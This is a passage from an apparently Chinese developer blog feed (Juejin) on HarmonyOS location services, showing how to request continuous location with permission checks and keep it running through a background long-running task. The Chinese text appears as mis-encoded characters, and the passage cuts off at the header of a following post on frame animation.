          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'promise, getCurrentLocation: error='</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(error));
        });
      <span class="hljs-comment">// .....</span>
    })
  }
}
</code></pre>
<h2 data-id="heading-2">æŒç»­å®šä½</h2>
<p>æŒç»­å®šä½ã€‚å¤šç”¨äºå¯¼èˆªã€è¿åŠ¨è½¨è¿¹ã€å‡ºè¡Œç­‰åœºæ™¯ã€‚</p>
<p>é¦–å…ˆè¦å®ä¾‹åŒ–<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V13%2Fjs-apis-geolocationmanager-V13%23continuouslocationrequest12" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V13/js-apis-geolocationmanager-V13#continuouslocationrequest12" target="_blank" ref="nofollow noopener noreferrer">ContinuousLocationRequest</a>å¯¹è±¡ï¼Œç”¨äºå‘ŠçŸ¥ç³»ç»Ÿè¯¥å‘åº”ç”¨æä¾›ä½•ç§ç±»å‹çš„ä½ç½®æœåŠ¡ï¼Œä»¥åŠä½ç½®ç»“æœä¸ŠæŠ¥çš„é¢‘ç‡ã€‚</p>
<ul>
<li>è®¾ç½®locationScenarioï¼š</li>
</ul>
<p>å»ºè®®locationScenarioå‚æ•°ä¼˜å…ˆæ ¹æ®åº”ç”¨çš„ä½¿ç”¨åœºæ™¯è¿›è¡Œè®¾ç½®ï¼Œè¯¥å‚æ•°æšä¸¾å€¼å®šä¹‰å‚è§<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V13%2Fjs-apis-geolocationmanager-V13%23useractivityscenario12" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V13/js-apis-geolocationmanager-V13#useractivityscenario12" target="_blank" ref="nofollow noopener noreferrer">UserActivityScenario</a>ï¼Œä¾‹å¦‚åœ°å›¾åœ¨å¯¼èˆªæ—¶ä½¿ç”¨NAVIGATIONå‚æ•°ï¼Œå¯ä»¥æŒç»­åœ¨å®¤å†…å’Œå®¤å¤–åœºæ™¯è·å–ä½ç½®ç”¨äºå¯¼èˆªã€‚</p>
<ul>
<li>è®¾ç½®intervalï¼š</li>
</ul>
<p>è¡¨ç¤ºä¸ŠæŠ¥ä½ç½®ä¿¡æ¯çš„æ—¶é—´é—´éš”ï¼Œå•ä½æ˜¯ç§’ï¼Œé»˜è®¤å€¼ä¸º1ç§’ã€‚å¦‚æœå¯¹ä½ç½®ä¸ŠæŠ¥æ—¶é—´é—´éš”æ— ç‰¹æ®Šè¦æ±‚ï¼Œå¯ä»¥ä¸å¡«å†™è¯¥å­—æ®µã€‚</p>
<p>ä»¥åœ°å›¾å¯¼èˆªåœºæ™¯ä¸ºä¾‹ï¼Œè°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">request</span>: geoLocationManager.<span class="hljs-property">ContinuousLocationRequest</span>= {
   <span class="hljs-string">'interval'</span>: <span class="hljs-number">1</span>,
   <span class="hljs-string">'locationScenario'</span>: geoLocationManager.<span class="hljs-property">UserActivityScenario</span>.<span class="hljs-property">NAVIGATION</span>
}
<span class="hljs-keyword">let</span> locationCallback = (<span class="hljs-attr">location</span>:geoLocationManager.<span class="hljs-property">Location</span>):<span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'locationCallback: data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(location));
};
<span class="hljs-keyword">try</span> {
   geoLocationManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">'locationChange'</span>, request, locationCallback);
} <span class="hljs-keyword">catch</span> (err) {
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"errCode:"</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
}
</code></pre>
<p>å¦‚æœä¸ä¸»åŠ¨ç»“æŸå®šä½å¯èƒ½å¯¼è‡´è®¾å¤‡åŠŸè€—é«˜ï¼Œè€—ç”µå¿«ï¼›å»ºè®®åœ¨ä¸éœ€è¦è·å–å®šä½ä¿¡æ¯æ—¶åŠæ—¶ç»“æŸå®šä½ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet">geoLocationManager.<span class="hljs-keyword">off</span>(<span class="hljs-comment">'locationChange', locationCallback);</span>
</code></pre>
<p>å®Œæ•´å®ä¾‹ä»£ç </p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">import</span> { abilityAccessCtrl } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { permissionUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/PermissionUtil'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-title function_">locationCallback</span>(<span class="hljs-params">location:geoLocationManager.Location</span>)  {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'locationCallback: data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(location));
  }

  <span class="hljs-title function_">aboutToDisappear</span>(<span class="hljs-params"/>) {
    geoLocationManager.<span class="hljs-title function_">off</span>(<span class="hljs-string">'locationChange'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">locationCallback</span>);
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-string">'è·å–ä½ç½®ä¿¡æ¯'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-comment">// 1 é…ç½®æ–‡ä»¶ ç”³è¯·æƒé™   åŒæ—¶ç”³è¯·ohos.permission.APPROXIMATELY_LOCATIONå’Œohos.permission.LOCATION è·å–åˆ°ç²¾å‡†ä½ç½®ï¼Œç²¾å‡†åº¦åœ¨ç±³çº§åˆ«ã€‚</span>
      <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> permissionUtil.<span class="hljs-title function_">checkPermissions</span>([<span class="hljs-string">'ohos.permission.APPROXIMATELY_LOCATION'</span>, <span class="hljs-string">'ohos.permission.LOCATION'</span>], <span class="hljs-title function_">getContext</span>());
      <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>

      <span class="hljs-comment">// 2 æ£€æŸ¥å…¨å±€å¼€å…³  å¼€äº†-ç»§ç»­èµ°ï¼Œæ²¡å¼€-å¼¹å‡ºè®©ä»–æˆæƒ</span>
      <span class="hljs-keyword">const</span> locationEnabled = geoLocationManager.<span class="hljs-title function_">isLocationEnabled</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æŸ¥çœ‹å½“å‰å…¨å±€å¼€å…³çŠ¶æ€ï¼š'</span>, locationEnabled)

      <span class="hljs-keyword">if</span> (!locationEnabled) {  <span class="hljs-comment">// æ²¡å¼€</span>
        <span class="hljs-keyword">const</span> <span class="hljs-attr">atManager</span>: abilityAccessCtrl.<span class="hljs-property">AtManager</span> = abilityAccessCtrl.<span class="hljs-title function_">createAtManager</span>();
        <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> atManager.<span class="hljs-title function_">requestGlobalSwitch</span>(<span class="hljs-title function_">getContext</span>(), abilityAccessCtrl.<span class="hljs-property">SwitchType</span>.<span class="hljs-property">LOCATION</span>)
        <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// æ‹‰èµ·å…¨å±€å¼¹å‡º ç”¨æˆ·æ²¡æˆæƒå°±ç»ˆæ­¢ä»£ç æ‰§è¡Œ</span>
      }

      <span class="hljs-comment">// 3. è·å–ä½ç½®ä¿¡æ¯  ç»åº¦çº¬åº¦ ã€æŒç»­å®šä½ã€‚å¤šç”¨äºå¯¼èˆªã€è¿åŠ¨è½¨è¿¹ã€å‡ºè¡Œç­‰åœºæ™¯ã€‚ã€‘</span>
      geoLocationManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">'locationChange'</span>, {
        <span class="hljs-attr">interval</span>: <span class="hljs-number">1</span>,
        <span class="hljs-attr">locationScenario</span>: geoLocationManager.<span class="hljs-property">UserActivityScenario</span>.<span class="hljs-property">NAVIGATION</span>
      }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">locationCallback</span>);

      <span class="hljs-comment">// .....</span>
    })
  }
}
</code></pre>
<h2 data-id="heading-3">åå°å®šä½-é•¿æ—¶ä»»åŠ¡</h2>
<p><strong>åº”ç”¨é€€è‡³åå°å</strong>ï¼Œåœ¨åå°éœ€è¦é•¿æ—¶é—´è¿è¡Œç”¨æˆ·å¯æ„ŸçŸ¥çš„ä»»åŠ¡ï¼Œå¦‚æ’­æ”¾éŸ³ä¹ã€å¯¼èˆªç­‰ã€‚ä¸ºé˜²æ­¢<strong>åº”ç”¨è¿›ç¨‹è¢«æŒ‚èµ·</strong>ï¼Œå¯¼è‡´å¯¹åº”åŠŸèƒ½å¼‚å¸¸ï¼Œå¯ä»¥<strong>ç”³è¯·é•¿æ—¶ä»»åŠ¡</strong>ï¼Œä½¿åº”ç”¨åœ¨åå°é•¿æ—¶é—´è¿è¡Œã€‚åœ¨é•¿æ—¶ä»»åŠ¡ä¸­å¯ä»¥ç”³è¯·å¤šç§ç±»å‹çš„ä»»åŠ¡ï¼Œå¹¶å¯¹ä»»åŠ¡ç±»å‹è¿›è¡Œæ›´æ–°ã€‚åº”ç”¨é€€åå°æ‰§è¡Œä¸šåŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šåšä¸€è‡´æ€§æ ¡éªŒï¼Œç¡®ä¿åº”ç”¨åœ¨æ‰§è¡Œç›¸åº”çš„é•¿æ—¶ä»»åŠ¡ã€‚åŒæ—¶ï¼Œç³»ç»Ÿæœ‰ä¸é•¿æ—¶ä»»åŠ¡ç›¸å…³è”çš„é€šçŸ¥æ æ¶ˆæ¯ï¼Œç”¨æˆ·åˆ é™¤é€šçŸ¥æ æ¶ˆæ¯æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åœæ­¢é•¿æ—¶ä»»åŠ¡ã€‚</p>
<p>1.éœ€è¦ç”³è¯·ohos.permission.KEEP_BACKGROUND_RUNNINGæƒé™ï¼Œé…ç½®æ–¹å¼è¯·å‚è§<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V13%2Fdeclare-permissions-V13" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V13/declare-permissions-V13" target="_blank" ref="nofollow noopener noreferrer">å£°æ˜æƒé™</a>ã€‚</p>
<p>2.å£°æ˜åå°æ¨¡å¼ç±»å‹ã€‚</p>
<p>åœ¨module.json5é…ç½®æ–‡ä»¶ä¸­ä¸ºéœ€è¦ä½¿ç”¨é•¿æ—¶ä»»åŠ¡çš„UIAbilityå£°æ˜ç›¸åº”çš„é•¿æ—¶ä»»åŠ¡ç±»å‹ï¼ˆé…ç½®æ–‡ä»¶ä¸­å¡«å†™é•¿æ—¶ä»»åŠ¡ç±»å‹çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V13%2Fcontinuous-task-V13%23%25E4%25BD%25BF%25E7%2594%25A8%25E5%259C%25BA%25E6%2599%25AF" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V13/continuous-task-V13#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF" target="_blank" ref="nofollow noopener noreferrer">é…ç½®é¡¹</a>ï¼‰ã€‚</p>
<pre><code class="hljs language-json" lang="json"> <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
     <span class="hljs-attr">"abilities"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
         <span class="hljs-punctuation">{</span>
        			<span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"EntryAbility"</span><span class="hljs-punctuation">,</span>
          		 <span class="hljs-comment">// ...</span>
              <span class="hljs-comment">// ...</span>
              <span class="hljs-comment">// </span>
              <span class="hljs-attr">"backgroundModes"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
              	<span class="hljs-comment">// é•¿æ—¶ä»»åŠ¡ç±»å‹çš„é…ç½®é¡¹</span>
             		<span class="hljs-string">"audioRecording"</span>
               	æˆ–è€…
          			<span class="hljs-string">"location"</span>   âœ…
             <span class="hljs-punctuation">]</span>
         <span class="hljs-punctuation">}</span>
     <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
     ...
 <span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>åˆ›å»ºBackgroundTaskUtil.etsæ–‡ä»¶å°è£…é•¿çŸ­æ—¶ä»»åŠ¡</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { backgroundTaskManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.BackgroundTasksKit'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BusinessError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.BasicServicesKit'</span>;
<span class="hljs-keyword">import</span> { common, <span class="hljs-title class_">WantAgent</span>, wantAgent } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BackgroundTaskUtil</span> {

  <span class="hljs-comment">// é•¿ä»»åŠ¡-å¼€å¯</span>
  <span class="hljs-title function_">startLongTask</span>(<span class="hljs-params">list:<span class="hljs-built_in">string</span>[], callback: () =&gt; <span class="hljs-built_in">void</span></span>) {  <span class="hljs-comment">// listä»»åŠ¡ç±»å‹ï¼Œ callbackå¼€å¯æˆåŠŸåèµ°çš„å›è°ƒ</span>
    <span class="hljs-keyword">let</span> <span class="hljs-attr">wantAgentInfo</span>: wantAgent.<span class="hljs-property">WantAgentInfo</span> = {
      <span class="hljs-comment">// ç‚¹å‡»é€šçŸ¥åï¼Œå°†è¦æ‰§è¡Œçš„åŠ¨ä½œåˆ—è¡¨</span>
      <span class="hljs-comment">// æ·»åŠ éœ€è¦è¢«æ‹‰èµ·åº”ç”¨çš„bundleNameå’ŒabilityName</span>
      <span class="hljs-attr">wants</span>: [
        {
          <span class="hljs-attr">bundleName</span>: (<span class="hljs-title function_">getContext</span>() <span class="hljs-keyword">as</span> common.<span class="hljs-property">UIAbilityContext</span>).<span class="hljs-property">abilityInfo</span>.<span class="hljs-property">bundleName</span>,
          <span class="hljs-attr">abilityName</span>: <span class="hljs-string">"EntryAbility"</span>
        }
      ],
      <span class="hljs-comment">// æŒ‡å®šç‚¹å‡»é€šçŸ¥æ æ¶ˆæ¯åçš„åŠ¨ä½œæ˜¯æ‹‰èµ·ability</span>
      <span class="hljs-attr">actionType</span>: wantAgent.<span class="hljs-property">OperationType</span>.<span class="hljs-property">START_ABILITY</span>,
      <span class="hljs-comment">// ä½¿ç”¨è€…è‡ªå®šä¹‰çš„ä¸€ä¸ªç§æœ‰å€¼</span>
      <span class="hljs-attr">requestCode</span>: <span class="hljs-number">0</span>,
      <span class="hljs-comment">// ç‚¹å‡»é€šçŸ¥åï¼ŒåŠ¨ä½œæ‰§è¡Œå±æ€§</span>
      <span class="hljs-attr">actionFlags</span>: [wantAgent.<span class="hljs-property">WantAgentFlags</span>.<span class="hljs-property">UPDATE_PRESENT_FLAG</span>],
      <span class="hljs-comment">// è½¦é’¥åŒ™é•¿æ—¶ä»»åŠ¡å­ç±»å‹ã€‚åªæœ‰ç”³è¯·bluetoothInteractionç±»å‹çš„é•¿æ—¶ä»»åŠ¡ï¼Œè½¦é’¥åŒ™å­ç±»å‹æ‰èƒ½ç”Ÿæ•ˆã€‚</span>
      <span class="hljs-comment">// ç¡®ä¿extraInfoå‚æ•°ä¸­çš„Keyå€¼ä¸ºbackgroundTaskManager.BackgroundModeType.SUB_MODEï¼Œå¦åˆ™å­ç±»å‹ä¸ç”Ÿæ•ˆã€‚</span>
      <span class="hljs-comment">// extraInfo: { [backgroundTaskManager.BackgroundModeType.SUB_MODE] : backgroundTaskManager.BackgroundSubMode.CAR_KEY }</span>
    };

    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// é€šè¿‡wantAgentæ¨¡å—ä¸‹getWantAgentæ–¹æ³•è·å–WantAgentå¯¹è±¡</span>
      wantAgent.<span class="hljs-title function_">getWantAgent</span>(wantAgentInfo).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">wantAgentObj: WantAgent</span>) =&gt;</span> {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-comment">// let list: Array&lt;string&gt; = ["audioRecording"];</span>
          <span class="hljs-comment">// let list: Array&lt;string&gt; = ["bluetoothInteraction"]; é•¿æ—¶ä»»åŠ¡ç±»å‹åŒ…å«bluetoothInteractionï¼ŒCAR_KEYå­ç±»å‹åˆæ³•</span>
          backgroundTaskManager.<span class="hljs-title function_">startBackgroundRunning</span>(<span class="hljs-title function_">getContext</span>(), list, wantAgentObj).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res: backgroundTaskManager.ContinuousTaskNotification</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">"Operation startBackgroundRunning succeeded"</span>);
            <span class="hljs-comment">// æ­¤å¤„æ‰§è¡Œå…·ä½“çš„é•¿æ—¶ä»»åŠ¡é€»è¾‘ï¼Œå¦‚å½•éŸ³ï¼Œå½•åˆ¶ç­‰ã€‚</span>
            <span class="hljs-comment">// å†™å°è¯•ä»»åŠ¡</span>
            <span class="hljs-title function_">callback</span>()
          }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error: BusinessError</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to Operation startBackgroundRunning. code is <span class="hljs-subst">${error.code}</span> message is <span class="hljs-subst">${error.message}</span>`</span>);
          });
        } <span class="hljs-keyword">catch</span> (error) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to Operation startBackgroundRunning. code is <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> BusinessError).code}</span> message is <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> BusinessError).message}</span>`</span>);
        }
      });
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to Operation getWantAgent. code is <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> BusinessError).code}</span> message is <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> BusinessError).message}</span>`</span>);
    }

  }
  <span class="hljs-comment">// é•¿ä»»åŠ¡-å…³é—­</span>
  <span class="hljs-title function_">stopLongTask</span>(<span class="hljs-params"/>) {
    backgroundTaskManager.<span class="hljs-title function_">stopBackgroundRunning</span>(<span class="hljs-title function_">getContext</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">`Succeeded in operationing stopBackgroundRunning.`</span>);
    }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err: BusinessError</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to operation stopBackgroundRunning. Code is <span class="hljs-subst">${err.code}</span>, message is <span class="hljs-subst">${err.message}</span>`</span>);
    });
  }

  <span class="hljs-comment">// çŸ­ä»»åŠ¡-å¼€å¯</span>
  <span class="hljs-comment">// çŸ­ä»»åŠ¡-å…³é—­</span>
}

<span class="hljs-keyword">export</span>  <span class="hljs-keyword">const</span> backgroundTaskUtil = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BackgroundTaskUtil</span>()
</code></pre>
<ul>
<li>ç¤ºä¾‹ä»£ç </li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">import</span> { abilityAccessCtrl } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { permissionUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/PermissionUtil'</span>;
<span class="hljs-keyword">import</span> { backgroundTaskUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/BackgroundTaskUtil'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-title function_">locationCallback</span>(<span class="hljs-params">location:geoLocationManager.Location</span>)  {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'locationCallback: data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(location));
  }

  <span class="hljs-title function_">aboutToDisappear</span>(<span class="hljs-params"/>) {
    geoLocationManager.<span class="hljs-title function_">off</span>(<span class="hljs-string">'locationChange'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">locationCallback</span>);
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-string">'è·å–ä½ç½®ä¿¡æ¯'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-comment">// 1 é…ç½®æ–‡ä»¶ ç”³è¯·æƒé™   åŒæ—¶ç”³è¯·ohos.permission.APPROXIMATELY_LOCATIONå’Œohos.permission.LOCATION è·å–åˆ°ç²¾å‡†ä½ç½®ï¼Œç²¾å‡†åº¦åœ¨ç±³çº§åˆ«ã€‚</span>
      <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> permissionUtil.<span class="hljs-title function_">checkPermissions</span>([<span class="hljs-string">'ohos.permission.APPROXIMATELY_LOCATION'</span>, <span class="hljs-string">'ohos.permission.LOCATION'</span>], <span class="hljs-title function_">getContext</span>());
      <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>

      <span class="hljs-comment">// 2 æ£€æŸ¥å…¨å±€å¼€å…³  å¼€äº†-ç»§ç»­èµ°ï¼Œæ²¡å¼€-å¼¹å‡ºè®©ä»–æˆæƒ</span>
      <span class="hljs-keyword">const</span> locationEnabled = geoLocationManager.<span class="hljs-title function_">isLocationEnabled</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æŸ¥çœ‹å½“å‰å…¨å±€å¼€å…³çŠ¶æ€ï¼š'</span>, locationEnabled)

      <span class="hljs-keyword">if</span> (!locationEnabled) {  <span class="hljs-comment">// æ²¡å¼€</span>
        <span class="hljs-keyword">const</span> <span class="hljs-attr">atManager</span>: abilityAccessCtrl.<span class="hljs-property">AtManager</span> = abilityAccessCtrl.<span class="hljs-title function_">createAtManager</span>();
        <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> atManager.<span class="hljs-title function_">requestGlobalSwitch</span>(<span class="hljs-title function_">getContext</span>(), abilityAccessCtrl.<span class="hljs-property">SwitchType</span>.<span class="hljs-property">LOCATION</span>)
        <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// æ‹‰èµ·å…¨å±€å¼¹å‡º ç”¨æˆ·æ²¡æˆæƒå°±ç»ˆæ­¢ä»£ç æ‰§è¡Œ</span>
      }

      <span class="hljs-comment">// 3. è·å–ä½ç½®ä¿¡æ¯  ç»åº¦çº¬åº¦ ã€æŒç»­å®šä½ã€‚å¤šç”¨äºå¯¼èˆªã€è¿åŠ¨è½¨è¿¹ã€å‡ºè¡Œç­‰åœºæ™¯ã€‚ã€‘</span>
      backgroundTaskUtil.<span class="hljs-title function_">startLongTask</span>([<span class="hljs-string">'location'</span>], <span class="hljs-function">() =&gt;</span> {
        geoLocationManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">'locationChange'</span>, {
          <span class="hljs-attr">interval</span>: <span class="hljs-number">1</span>,
          <span class="hljs-attr">locationScenario</span>: geoLocationManager.<span class="hljs-property">UserActivityScenario</span>.<span class="hljs-property">NAVIGATION</span>
        }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">locationCallback</span>);
      })
      <span class="hljs-comment">// .....</span>
    })
  }
}
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2F0a0a956faec348ddaa9b2676a3f19545%3Ftype%3D1%3Fha_source%3Dhmosclass%26ha_sourceId%3D89000248" title="https://developer.huawei.com/consumer/cn/training/classDetail/0a0a956faec348ddaa9b2676a3f19545?type=1?ha_source=hmosclass&amp;ha_sourceId=89000248" target="_blank" ref="nofollow noopener noreferrer">é¸¿è’™å¼€å‘è€…ç­çº§</a></p>
<p>âœ¨å®¶äººä»¬ç‚¹ä¸ªjuejinè´¦å·å…³æ³¨ï¼Œä¼šæŒç»­å‘å¸ƒå¤§å‰ç«¯é¢†åŸŸæŠ€æœ¯æ–‡ç« ğŸ’• ğŸƒ</p>
<p>âœ¨å®¶äººä»¬ç‚¹ä¸ªjuejinè´¦å·å…³æ³¨ï¼Œä¼šæŒç»­å‘å¸ƒå¤§å‰ç«¯é¢†åŸŸæŠ€æœ¯æ–‡ç« ğŸ’• ğŸƒ</p>
<p>âœ¨å®¶äººä»¬ç‚¹ä¸ªjuejinè´¦å·å…³æ³¨ï¼Œä¼šæŒç»­å‘å¸ƒå¤§å‰ç«¯é¢†åŸŸæŠ€æœ¯æ–‡ç« ğŸ’• ğŸƒ</p>
<p>Â  Â  ^_^ ç‚¹å…³æ³¨ã€ä¸è¿·è·¯ã€ä¸»æ’­å¸¦ä½ å­¦æŠ€æœ¯ (à¹‘â€²á´—â€µà¹‘)ï¼© Láµ’áµ›áµ‰áµ§â‚’áµ¤â¤</p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS å¸§åŠ¨ç”» animator]]></title>    <link>https://juejin.cn/post/7576953459544342582</link>    <guid>https://juejin.cn/post/7576953459544342582</guid>    <pubDate>2025-11-27T05:25:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576953459544342582" data-draft-id="7576994308273225747" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS å¸§åŠ¨ç”» animator"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-27T05:25:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ITå……ç”µç«™"/> <meta itemprop="url" content="https://juejin.cn/user/125809758576431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS å¸§åŠ¨ç”» animator
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/125809758576431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ITå……ç”µç«™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:25:28.000Z" title="Thu Nov 27 2025 05:25:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
